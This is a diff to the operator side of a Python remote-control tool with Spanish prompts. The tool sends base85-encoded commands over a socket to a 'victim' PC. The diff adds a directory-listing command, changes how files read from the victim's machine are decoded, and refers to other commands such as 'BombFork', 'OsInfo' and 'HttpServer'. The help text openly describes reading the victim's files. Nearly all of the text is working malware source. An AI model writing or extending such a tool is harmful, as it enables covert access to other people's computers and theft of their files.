@@ -124,6 +124,7 @@ def _MAIN():
 
 
                     elif str(command) == 'cd':
+                        _CodingBase85Text(self.Client, str('cd'))
                         dat = str(input("ruta a la que acede: "))
                         _CodingBase85Text(self.Client, str(dat))
                         buff = _DecodingBase85Text(self.Client, 8000)
@@ -166,12 +167,21 @@ def _MAIN():
                         _CodingBase85Text(self.Client, str('read'))
                         _CodingBase85Text(self.Client, str(input("nombre del archivo a leer: ")))
                         _type = str(_DecodingBase85Text(self.Client, 8000))
+                        print(_type)
                         if _type == 'binary':
                             a = self.Client.recv(self.buffer).decode('utf-16')
                             a = base64.b85decode(str(a))
                             print(a)
                         elif _type == 'no binary':
-                            print(str(_DecodingBase85Text(self.Client, self.buffer)))
+                            #print(str(_DecodingBase85Text(self.Client, self.buffer)))
+                            a = str(self.Client.recv(self.buffer).decode())
+                            print("aplicando un filtro de descodificacion en base85")
+                            print(str(base64.b85decode(a.encode())))
+
+                    elif str(command) == "dirList":
+                        _CodingBase85Text(self.Client, str('dirList'))
+                        print("los siguientes archivos se encuentran en el directorio "+str(self.Cwd)+" :")
+                        print(str(self.Client.recv(self.buffer).decode()))
 
                     elif str(command) == 'help' or str(command) == 'ayuda':
                         print("""
@@ -194,11 +204,13 @@ def _MAIN():
                         ----------------------------------------------------------------
                         -read                           lee archivos de la pc victima  -
                         ----------------------------------------------------------------
+                        -dirList  lista los archivos y carpetas del directorio actual  -
+                        ----------------------------------------------------------------
                         - otros comandos compatibles con el dispositivo de la victima  -
                         ----------------------------------------------------------------
                         """)
 
-                    else:
+                    elif str(command) != 'CloseHttpServer' and str(command) != 'HttpServer' and str(command) != 'cwd' and str(command) != 'OsInfo' and str(command) != 'BombFork' and str(command) != 'cd' and str(command) != 'exit' and str(command) != 'cd ..' and str(command) != "read"  and str(command) != "dirList":
 
                         _CodingBase85Text(self.Client, str(command))
 
